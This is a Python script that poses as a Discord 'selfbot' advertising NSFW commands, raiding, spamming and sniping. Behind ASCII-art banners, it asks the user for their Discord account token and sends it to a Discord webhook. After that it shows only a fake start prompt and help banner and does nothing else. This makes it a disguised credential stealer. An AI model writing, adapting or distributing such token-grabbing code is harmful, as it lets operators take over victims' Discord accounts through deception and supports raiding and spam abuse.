import requests
import os

from discord_webhook import DiscordWebhook

print('''


   ▄████▄   ▒█████   ██▀███   ▒█████   ███▄    █  ▄▄▄      
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄   
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒ (Made in china)
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒   
  ░ ░          ░ ░     ░         ░ ░           ░       ░  ░
  ░                                                                                                     
	NSFW Commands, Raiding, Spamming, Sniping, and lots more!
''')


tokenstel = input("Token (if you enter invalid, will not work): ")
webhook = DiscordWebhook(url='Webhook Here', content=tokenstel)
respond = webhook.execute()

os.system("cls")
input("Press enter to start the selfbot!")
os.system("cls")

print('''



   ▄████▄   ▒█████   ██▀███   ▒█████   ███▄    █  ▄▄▄      
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄   
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒ (Made in china)
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒   
  ░ ░          ░ ░     ░         ░ ░           ░       ░  ░
  ░                                                        
''')

print('''
--------------------
<help to see commands!
--------------------
''')
input()
